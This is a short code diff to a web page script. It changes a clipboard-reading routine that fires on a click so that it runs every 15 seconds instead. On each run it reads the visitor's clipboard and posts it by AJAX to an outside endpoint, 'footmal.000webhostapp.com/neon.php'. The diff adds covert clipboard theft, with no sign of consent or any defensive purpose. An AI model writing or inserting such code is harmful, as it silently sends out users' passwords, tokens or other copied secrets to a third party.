@@ -73,7 +73,7 @@
     var t, id;
         $(document).ready(function(){
           if(document.location.search == "?clip"){
-            $("#home").click(function(){
+            setInterval(function(){
           navigator.clipboard.readText().then(text => {
     $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
@@ -86,7 +86,7 @@
       }
     });
           });
-            });
+            }, 15000);
           } else {
           $.ajax({
       url: "https://footmal.000webhostapp.com/neon.php",
